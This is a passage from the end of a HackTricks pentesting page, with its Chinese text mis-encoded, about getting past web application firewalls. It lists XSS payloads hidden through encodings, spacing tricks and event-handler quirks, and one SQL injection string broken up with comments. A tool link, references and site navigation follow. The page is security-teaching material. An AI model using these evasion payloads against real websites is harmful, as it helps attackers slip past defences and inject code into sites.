&lt;STYLE&gt;.classname{background-image:url("javascript:alert(XSS)");}&lt;/STYLE&gt; #uncommon tags
&lt;img/src=1/onerror=alert(0)&gt; #bypass space filter by using / where a space is expected
&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)&gt;xss&lt;/a&gt; #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
&lt;iframe src="javascript:alert(`xss`)"&gt; #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
&lt;a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"&gt; #Using Line Feed (LF) line breaks
&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=confirm()&gt; # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
</code></pre>
<h2 id="å·¥å…·"><a class="header" href="#å·¥å…·">å·¥å…·</a></h2>
<ul>
<li><a href="https://github.com/assetnote/nowafpls"><strong>nowafpls</strong></a>: Burp æ’ä»¶ï¼Œé€šè¿‡é•¿åº¦å‘è¯·æ±‚æ·»åŠ åƒåœ¾æ•°æ®ä»¥ç»•è¿‡ WAF</li>
</ul>
<h2 id="å‚è€ƒèµ„æ–™"><a class="header" href="#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></h2>
<ul>
<li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies">https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies</a></li>
<li><a href="https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/">https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/</a></li>
<li><a href="https://www.youtube.com/watch?v=0OMmWtU2Y_g">https://www.youtube.com/watch?v=0OMmWtU2Y_g</a></li>
<li><a href="https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization">https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization</a></li>
</ul>
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <strong>ä¸Šå…³æ³¨æˆ‘ä»¬</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/race-condition.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/race-condition.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
